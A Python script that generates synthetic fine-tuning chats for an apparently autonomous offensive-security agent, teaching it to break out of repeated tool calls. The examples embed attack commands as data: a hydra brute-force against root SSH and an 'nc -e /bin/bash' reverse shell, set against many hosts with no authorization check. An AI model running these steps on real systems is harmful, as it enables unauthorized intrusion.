"""Fase 1 (v3) — synthesize anti-loop NEGATIVE examples (≥500, diverse).

The 3-experiment A/B showed the FT loops (re-issues the same tool call). The
public T-C-O data only shows "what to do right"; the model never saw the
recovery pattern: *after a repeated call with no new info, STOP or change
tactic*. These synthetic examples teach exactly that transition.

To avoid overfitting to a handful of scenarios (the 3-epoch failure mode), we
generate REAL diversity: a pool of distinct targets × a set of situations ×
the recover-pattern. Every example has a different host/URL, tool, observation
and recovery, so the model learns the *pattern* (redundancy → pivot/stop), not
specific strings.

Two example shapes:
  - PIVOT: legitimate call → result, identical call again → identical result,
    TARGET assistant recognizes the redundancy and pivots to a DIFFERENT tool.
  - STOP: a call confirms the objective; TARGET assistant concludes (no tool).

    python scripts/finetune/make_antiloop.py --out data/finetune/antiloop.jsonl --min 500
"""

from __future__ import annotations

import argparse
import json

SYSTEM_PROMPT = (
    "You are Kryon, an autonomous offensive-security agent operating a tight "
    "ReAct loop. You have specific tools — prefer the most specific one for the "
    "job and fall back to `run_command` for generic shell. At each turn: read "
    "the previous observation, reason briefly, then EITHER call exactly one tool "
    "that advances the objective, OR — when the objective is met — STOP and "
    "report. Never repeat an identical call, never loop, and do not call a tool "
    "once the goal is achieved."
)

# Distinct targets — IPs, hostnames and URLs — so each example differs.
_HOSTS = [
    "10.10.10.5", "10.10.14.23", "192.168.56.101", "172.16.4.9", "10.0.0.42",
    "10.129.96.7", "192.168.1.250", "172.20.10.3", "10.10.11.118", "192.168.0.77",
    "scanme.target.lab", "intranet.corp.test", "vpn.acme.internal", "git.dev.local",
    "mail.example.org", "shop.example.com", "api.fintech.test", "portal.bank.test",
    "jenkins.ci.local", "grafana.mon.test", "wiki.team.internal", "files.share.test",
    "auth.idp.test", "staging.app.test", "admin.panel.test", "db.backend.test",
    "registry.k8s.test", "proxy.edge.test", "cdn.assets.test", "vault.sec.test",
    "10.10.10.99", "10.200.5.14", "192.168.10.40", "172.31.0.8", "10.13.37.21",
    "10.10.10.250", "dev.api.test", "owa.mail.test", "phpmyadmin.db.test",
    "tomcat.app.test", "nexus.repo.test", "sonar.ci.test",
]


def _url(host: str) -> str:
    return host if host.startswith(("http://", "https://")) else f"http://{host}"


# PIVOT situations: a function (host)->dict producing the scenario fields. The
# repeated call's tool+args are identical; the TARGET pivots to pivot_tool.
def _pivot_sits(host: str):
    u = _url(host)
    return [
        dict(goal=f"audit the web app at {u}", tool="web_fetch_smart", args={"url": u},
             obs="HTTP 200, nginx, a client-rendered SPA shell (<app-root>), no readable body text.",
             pivot_tool="gobuster_dir", pivot_args={"target": u},
             recover=f"{u} is a client-rendered SPA; re-fetching returns the same shell. I'll enumerate paths instead."),
        dict(goal=f"enumerate services on {host}", tool="nmap", args={"target": host, "args": "-sV"},
             obs="22/tcp open ssh (OpenSSH), 80/tcp open http (Apache 2.4.7). Scan complete.",
             pivot_tool="web_fetch_smart", pivot_args={"url": u},
             recover="The nmap scan already enumerated the open ports; re-scanning adds nothing. I'll inspect the web service."),
        dict(goal=f"test {u}/item?id=1 for SQL injection", tool="validate_sqli",
             args={"target_url": f"{u}/item?id=1", "parameter": "id"},
             obs="sqlmap: parameter 'id' is NOT injectable (no DBMS error, no boolean/time signal).",
             pivot_tool="validate_xss", pivot_args={"target_url": f"{u}/item?id=1"},
             recover="'id' is confirmed not injectable; re-running sqlmap repeats the same result. I'll test for XSS."),
        dict(goal=f"brute-force directories on {u}", tool="gobuster_dir", args={"target": u},
             obs="Found: /admin (401), /api (200), /static (200). Enumeration finished.",
             pivot_tool="web_fetch_smart", pivot_args={"url": f"{u}/api"},
             recover="Directory enumeration is done; re-running gobuster repeats it. I'll inspect the /api endpoint found."),
        dict(goal=f"fingerprint the web stack of {u}", tool="whatweb_scan", args={"target": u},
             obs="nginx, Bootstrap, jQuery 3.5, no version banner. Fingerprint complete.",
             pivot_tool="nikto_scan", pivot_args={"target": u},
             recover="The stack is fingerprinted; re-running whatweb gives the same output. I'll run a vuln scan next."),
        dict(goal=f"look up known CVEs affecting {host}", tool="duckduckgo_search",
             args={"query": f"{host} known vulnerabilities CVE"},
             obs="Only generic pages; no host-specific CVE results.",
             pivot_tool="web_fetch_smart", pivot_args={"url": f"{u}/robots.txt"},
             recover="The same search returns the same generic results; repeating it adds nothing. I'll probe the host directly."),
        dict(goal=f"check the SSH service on {host}", tool="run_command",
             args={"command": f"ssh -o BatchMode=yes root@{host}"},
             obs="Permission denied (publickey). No password auth offered.",
             pivot_tool="run_command", pivot_args={"command": f"hydra -l root -P rockyou.txt ssh://{host}"},
             recover="A plain SSH connect keeps failing with publickey-only; retrying the same command is pointless. I'll try a credential attack."),
        dict(goal=f"read the web root of {u}", tool="run_command", args={"command": f"curl -s {u}/"},
             obs="<html> minimal landing page, no links, no comments. Same as before.",
             pivot_tool="gobuster_dir", pivot_args={"target": u},
             recover="curl on the root keeps returning the same minimal page; fetching it again won't help. I'll brute-force paths."),
    ]


def _done_sits(host: str):
    u = _url(host)
    return [
        dict(goal=f"retrieve the user flag from {host}", tool="run_command",
             args={"command": "cat /home/user/user.txt"},
             obs="Contents: THM{user_flag_captured}. Flag retrieved.",
             stop="The user flag has been captured (THM{user_flag_captured}); the objective is met. Stopping — no further commands are needed."),
        dict(goal=f"confirm the security headers of {u}", tool="web_fetch_smart", args={"url": u},
             obs="Server: nginx. Missing: Content-Security-Policy, Strict-Transport-Security, X-Frame-Options.",
             stop="The missing security headers are confirmed (CSP, HSTS, X-Frame-Options). The audit objective is met; stopping rather than re-fetching."),
        dict(goal=f"get a shell on {host}", tool="run_command",
             args={"command": f"nc -e /bin/bash {host} 4444"},
             obs="Reverse shell established. uid=0(root) gid=0(root).",
             stop="A root shell (uid=0) is established — the objective is achieved. Stopping; further commands would be redundant."),
        dict(goal=f"confirm the open ports on {host}", tool="nmap", args={"target": host, "args": "-p-"},
             obs="Open: 22, 80, 443, 3306. Full TCP scan complete.",
             stop="The full port scan is complete (22, 80, 443, 3306). The enumeration objective is met; stopping rather than re-scanning."),
    ]


def _pivot_example(uid: str, sc: dict) -> dict:
    cid1, cid2, cid3 = f"{uid}_1", f"{uid}_2", f"{uid}_3"
    call = lambda cid, t, a: {"role": "assistant", "content": "",
                              "tool_calls": [{"id": cid, "type": "function",
                                              "function": {"name": t, "arguments": json.dumps(a)}}]}
    first = {"role": "assistant", "content": f"Starting with {sc['tool']} to make progress.",
             "tool_calls": [{"id": cid1, "type": "function",
                             "function": {"name": sc["tool"], "arguments": json.dumps(sc["args"])}}]}
    return {"messages": [
        {"role": "system", "content": SYSTEM_PROMPT},
        {"role": "user", "content": f"Goal: {sc['goal']}\n\nWhat is the next action?"},
        first,
        {"role": "tool", "tool_call_id": cid1, "content": sc["obs"]},
        call(cid2, sc["tool"], sc["args"]),  # the loop starting
        {"role": "tool", "tool_call_id": cid2, "content": sc["obs"]},  # identical result
        {"role": "assistant", "content": sc["recover"],  # TARGET: pivot
         "tool_calls": [{"id": cid3, "type": "function",
                         "function": {"name": sc["pivot_tool"], "arguments": json.dumps(sc["pivot_args"])}}]},
    ]}


def _stop_example(uid: str, sc: dict) -> dict:
    cid = f"{uid}_1"
    return {"messages": [
        {"role": "system", "content": SYSTEM_PROMPT},
        {"role": "user", "content": f"Goal: {sc['goal']}\n\nWhat is the next action?"},
        {"role": "assistant", "content": f"Running {sc['tool']} toward the goal.",
         "tool_calls": [{"id": cid, "type": "function",
                         "function": {"name": sc["tool"], "arguments": json.dumps(sc["args"])}}]},
        {"role": "tool", "tool_call_id": cid, "content": sc["obs"]},
        {"role": "assistant", "content": sc["stop"]},  # TARGET: STOP, no tool
    ]}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="data/finetune/antiloop.jsonl")
    ap.add_argument("--min", type=int, default=500)
    args = ap.parse_args()

    examples: list[dict] = []
    for hi, host in enumerate(_HOSTS):
        for si, sc in enumerate(_pivot_sits(host)):
            examples.append(_pivot_example(f"alp_{hi}_{si}", sc))
        for si, sc in enumerate(_done_sits(host)):
            examples.append(_stop_example(f"als_{hi}_{si}", sc))

    if len(examples) < args.min:
        print(f"WARNING: only {len(examples)} generated (< {args.min}); add hosts/situations.")

    with open(args.out, "w", encoding="utf-8") as fh:
        for ex in examples:
            fh.write(json.dumps(ex, ensure_ascii=False) + "\n")

    pivots = sum(1 for e in examples if len(e["messages"]) == 7)
    stops = len(examples) - pivots
    print(f"wrote {len(examples)} anti-loop examples -> {args.out}")
    print(f"  pivot-on-repeat: {pivots}  |  stop-on-done: {stops}  |  hosts: {len(_HOSTS)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
